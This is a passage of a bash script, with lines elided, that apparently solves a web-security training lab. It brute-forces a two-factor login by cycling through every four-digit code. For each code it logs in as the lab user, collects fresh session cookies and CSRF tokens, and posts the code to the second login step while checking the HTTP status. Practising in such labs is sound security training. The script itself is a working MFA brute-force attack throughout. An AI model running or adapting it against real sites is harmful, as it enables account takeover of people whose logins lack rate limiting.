...
for otp in $(seq -w 0000 9999); do
    ...
    response1=$(curl -X GET https://0aa60028045dcfe58126704400ef00d5.web-security-academy.net/login -v 2>&1)
    ...
    response2=$(curl https://0aa60028045dcfe58126704400ef00d5.web-security-academy.net/login -b "session=$cookie1" -d "csrf=$csrf1&username=carlos&password=montoya" -v 2>&1)
    ...
    response3=$(curl -X GET https://0aa60028045dcfe58126704400ef00d5.web-security-academy.net/login2 -b "session=$cookie2" -v 2>&1)
    ...
    # response2=$(curl -X GET https://0aa60028045dcfe58126704400ef00d5.web-security-academy.net/login2 -b "session=$cookie" -v 2>&1
    ...
    status=$(curl https://0aa60028045dcfe58126704400ef00d5.web-security-academy.net/login2 -b "session=$cookie2" -d "csrf=$csrf2&mfa-code=$otp" -w '%{http_code}' -so /dev/null)
